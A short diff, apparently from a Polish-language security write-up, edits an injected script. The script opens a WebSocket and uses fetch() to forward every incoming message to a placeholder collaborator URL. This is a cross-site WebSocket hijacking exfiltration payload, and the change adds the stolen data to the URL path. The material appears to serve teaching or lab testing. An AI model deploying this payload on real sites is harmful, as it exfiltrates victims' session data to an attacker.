@@ -16,6 +16,6 @@ Ogolnie to moglo bybyc polaczenie jakies zaufane na stronie a my mozemy rozbudow
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+        fetch('https://your-collaborator-url/'+event.data, {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
